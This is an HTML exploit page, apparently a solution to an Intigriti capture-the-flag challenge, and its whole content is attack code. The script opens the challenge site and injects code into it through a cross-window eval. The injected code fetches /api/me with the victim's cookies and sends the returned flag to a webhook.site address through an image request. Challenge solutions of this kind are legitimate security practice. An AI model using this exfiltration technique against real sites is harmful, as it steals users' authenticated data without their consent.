<!doctype html>
<html>
<body>
<script>
const win = window.open(
  "https://challenge-0126.intigriti.io/security.html"
);

setTimeout(() => {
  win.eval(`
    fetch('/api/me',{credentials:'include'})
      .then(r=>r.json())
      .then(d=>{
        if(d.flag){
          new Image().src =
            'https://webhook.site/3ae6a321-e1df-47a0-b4d3-ac23c1e28963?flag='
            + encodeURIComponent(d.flag);
        }
      });
  `);
}, 3000);
</script>
